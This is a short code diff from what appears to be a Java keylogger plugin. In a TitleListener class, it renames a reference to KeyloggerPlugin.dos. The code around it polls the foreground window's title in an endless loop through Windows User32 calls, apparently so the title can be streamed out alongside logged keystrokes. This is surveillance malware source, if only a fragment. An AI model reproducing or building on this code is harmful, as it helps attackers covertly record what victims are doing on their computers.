@@ -16,7 +16,7 @@ public class TitleListener implements Runnable {
 		try {
 			Thread.sleep(1000L);
 			while (true) {
-				if (Plugin.dos != null) {
+				if (KeyloggerPlugin.dos != null) {
 					User32DLL.GetWindowTextW(User32DLL.GetForegroundWindow(), BUFFER, MAX_TITLE_LENGTH);
 					String title = Native.toString(BUFFER);
 					
